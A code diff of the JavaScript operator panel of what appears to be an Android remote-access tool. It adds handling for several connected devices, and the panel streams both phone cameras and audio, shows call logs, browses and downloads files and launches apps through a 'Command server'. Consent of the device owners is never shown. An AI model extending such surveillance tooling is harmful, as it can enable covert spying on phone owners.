-  updateStatus('Failed to connect to signaling host');
-});
-
-socket.on('disconnect', () => {
-  updateStatus('Disconnected from Command server');
-});
+socket.on('connect', () => updateStatus('Connected to Command server'));
+socket.on('connect_error', () => updateStatus('Failed to connect to signaling host'));
+socket.on('disconnect', () => updateStatus('Disconnected from Command server'));
 
 socket.on('id', (id) => {
   myId = id;
   logDebug(`Authenticated session ID: ${myId}`);
 });
 
-socket.on('android-client-ready', (id) => {
-  if (androidClientId !== id) {
-    androidClientId = id;
-    logDebug(`Android Client Target identified: ${id}`);
-    updateStatus('Session established with device');
-    requestFileList(currentPath);
+// ── Android client connected (may include model/name/deviceId) ──
+socket.on('android-client-ready', (msg) => {
+  const id = msg && msg.id ? msg.id : msg;  // tolerate old format
+  if (!id) return;
+
+  devices.set(id, {
+    id: id,
+    model: (msg && msg.model) || null,
+    name: (msg && msg.name) || null,
+    deviceId: (msg && msg.deviceId) || null,
+    connectedAt: Date.now()
+  });
+
+  logDebug(`[DEVICE] Online: ${getDeviceLabel(id)} (${id})`);
+
+  const wasEmpty = devices.size === 1;
+  renderDeviceList();
+
+  // Auto-select first device when none is selected
+  if (!selectedDeviceId || wasEmpty) {
+    selectDevice(id);
+  } else {
+    updateStatus(`Device online: ${getDeviceLabel(id)}`);
+  }
+});
+
+// ── Android client disconnected ──
+socket.on('android-client-disconnected', (msg) => {
+  const id = msg && msg.id ? msg.id : msg;
+  if (!id) return;
+
+  const label = getDeviceLabel(id);
+  devices.delete(id);
+  renderDeviceList();
+
+  logDebug(`[DEVICE] Offline: ${label} (${id})`);
+
+  if (selectedDeviceId === id) {
+    // The selected device went away. Reset state.
+    selectedDeviceId = null;
+    resetUIForNoDevice();
+
+    if (devices.size > 0) {
+      const nextId = devices.keys().next().value;
+      selectDevice(nextId);
+    } else {
+      updateStatus('No devices connected');
+      renderDeviceList();
+    }
+  } else {
+    updateStatus(`Device offline: ${label}`);
   }
 });
 
@@ -1308,13 +1384,9 @@ socket.on('device_info', (info) => {
 
   if (info.battery !== undefined) {
     infoBattery.textContent = `${info.battery}%`;
-    if (info.battery <= 15) {
-      infoBattery.style.color = 'var(--danger)';
-    } else if (info.battery <= 35) {
-      infoBattery.style.color = 'var(--warning)';
-    } else {
-      infoBattery.style.color = 'var(--success)';
-    }
+    if (info.battery <= 15) infoBattery.style.color = 'var(--danger)';
+    else if (info.battery <= 35) infoBattery.style.color = 'var(--warning)';
+    else infoBattery.style.color = 'var(--success)';
   }
 
   if (info.batteryTemp !== undefined && info.chargingSource) {
@@ -1356,10 +1428,10 @@ socket.on('apps_list', (data) => {
 
     appList.querySelectorAll('.btn-launch-app').forEach(btn => {
       btn.addEventListener('click', (e) => {
-        if (!androidClientId) return;
+        if (!selectedDeviceId) return;
         const pkg = e.target.getAttribute('data-package');
         logDebug(`[CMD] Request launch for application: ${pkg}`);
-        socket.emit('cmd:launch_app', { to: androidClientId, packageName: pkg });
+        socket.emit('cmd:launch_app', { to: selectedDeviceId, packageName: pkg });
       });
     });
   }
@@ -1392,40 +1464,23 @@ socket.on('fs:delete_result', (data) => {
 
 socket.on('fs:thumb_batch', (data) => {
   if (!data || !data.batchId) return;
-
   const pending = pendingThumbBatches.get(data.batchId);
   if (!pending) return;
 
   const thumbs = data.thumbs || [];
   thumbs.forEach(t => {
-    thumbCache.set(t.path, {
-      kind: t.kind,
-      mime: t.mime,
-      dataUrl: `data:${t.mime};base64,${t.thumb}`
-    });
+    thumbCache.set(t.path, { kind: t.kind, mime: t.mime, dataUrl: `data:${t.mime};base64,${t.thumb}` });
   });
 
   logDebug(`[THUMB] Batch ${data.batchId} received (${thumbs.length} thumbs)`);
-
   pending.resolve();
   pendingThumbBatches.delete(data.batchId);
 });
 
-socket.on('fs:preview_meta', (data) => {
-  handlePreviewMeta(data);
-});
-
-socket.on('fs:preview_chunk', (data) => {
-  handlePreviewChunk(data);
-});
-
-socket.on('fs:preview_complete', (data) => {
-  handlePreviewComplete(data);
-});
-
-socket.on('fs:preview_error', (data) => {
-  handlePreviewError(data);
-});
+socket.on('fs:preview_meta', (data) => handlePreviewMeta(data));
+socket.on('fs:preview_chunk', (data) => handlePreviewChunk(data));
+socket.on('fs:preview_complete', (data) => handlePreviewComplete(data));
+socket.on('fs:preview_error', (data) => handlePreviewError(data));
 
 socket.on('fs:download_start', (data) => {
   if (!data) return;
@@ -1451,9 +1506,7 @@ socket.on('fs:download_chunk', (data) => {
       download.receivedChunks++;
     }
     const pct = Math.floor((download.receivedChunks / download.totalChunks) * 100);
-    if (pct % 10 === 0) {
-      updateStatus(`Downloading ${download.name} (${pct}%)`);
-    }
+    if (pct % 10 === 0) updateStatus(`Downloading ${download.name} (${pct}%)`);
   }
 });
 
@@ -1464,10 +1517,8 @@ socket.on('fs:download_complete', (data) => {
   if (download) {
     logDebug(`[FS] File download assembled: ${download.name}`);
     updateStatus(`Writing stream data...`);
-
     const base64Complete = download.buffer.join('');
     downloadBase64File(base64Complete, download.name);
-
     const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
     updateStatus(`Completed ${download.name} in ${duration}s`);
     delete activeDownloads[fileId];
@@ -1492,13 +1543,18 @@ function downloadBase64File(base64Data, fileName) {
   downloadLink.click();
 }
 
+// ─────────────────────────────────────────────────────────────
+// WebRTC Signaling — ONLY accept signals from selected device
+// ─────────────────────────────────────────────────────────────
+
 socket.on('signal', async (data) => {
   if (!data) return;
   const { from, signal } = data;
 
-  if (!androidClientId || androidClientId !== from) {
-    androidClientId = from;
-    updateStatus('Android device detected');
+  // Ignore any signal from a device that isn't currently selected
+  if (!selectedDeviceId || from !== selectedDeviceId) {
+    logDebug(`[WEBRTC] Ignoring signal from non-selected device: ${from}`);
+    return;
   }
 
   if (!peer) {
@@ -1517,16 +1573,11 @@ socket.on('signal', async (data) => {
         if (track.kind === 'audio') {
           audioTrack = track;
         } else if (track.kind === 'video') {
-          if (track.id === 'front_video' || track.id === 'front_camera') {
-            frontVideoTrack = track;
-          } else if (track.id === 'back_video' || track.id === 'back_camera') {
-            backVideoTrack = track;
-          } else {
-            if (mid === '0' && !frontVideoTrack) {
-              frontVideoTrack = track;
-            } else if (mid === '1' && !backVideoTrack) {
-              backVideoTrack = track;
-            }
+          if (track.id === 'front_video' || track.id === 'front_camera') frontVideoTrack = track;
+          else if (track.id === 'back_video' || track.id === 'back_camera') backVideoTrack = track;
+          else {
+            if (mid === '0' && !frontVideoTrack) frontVideoTrack = track;
+            else if (mid === '1' && !backVideoTrack) backVideoTrack = track;
           }
         }
         updateStreams();
@@ -1544,9 +1595,7 @@ socket.on('signal', async (data) => {
 
       peer.oniceconnectionstatechange = () => {
         updateStatus(`WebRTC: ${peer.iceConnectionState}`);
-        if (peer.iceConnectionState === 'failed') {
-          updateStatus('Connection failed. Refresh or retry.');
-        }
+        if (peer.iceConnectionState === 'failed') updateStatus('Connection failed. Refresh or retry.');
       };
 
     } catch (err) {
@@ -1572,33 +1621,17 @@ socket.on('signal', async (data) => {
   }
 });
 
-socket.on('android-client-disconnected', () => {
-  updateStatus('Android target disconnected');
-  if (peer) {
-    peer.close();
-    peer = null;
-    videoFront.srcObject = null;
-    videoBack.srcObject = null;
-  }
-  tagFront.textContent = 'FRONT DISCONNECTED';
-  tagFront.style.background = 'rgba(239, 68, 68, 0.15)';
-  tagFront.style.color = 'var(--danger)';
-  tagFront.style.borderColor = 'var(--danger)';
-
-  tagBack.textContent = 'BACK DISCONNECTED';
-  tagBack.style.background = 'rgba(239, 68, 68, 0.15)';
-  tagBack.style.color = 'var(--danger)';
-  tagBack.style.borderColor = 'var(--danger)';
-
-  callLogList.innerHTML = '';
-});
-
 socket.on('error', (error) => {
   if (error && error.message) updateStatus(`Signal Error: ${error.message}`);
 });
 
 retryButton.addEventListener('click', reconnectSocket);
 
+// ─────────────────────────────────────────────────────────────
 // Initialize
+// ─────────────────────────────────────────────────────────────
+
 updateStatus('Connecting to signaling...');
 switchTab(tabCalls, paneCalls);
+renderDeviceList();
+resetUIForNoDevice();
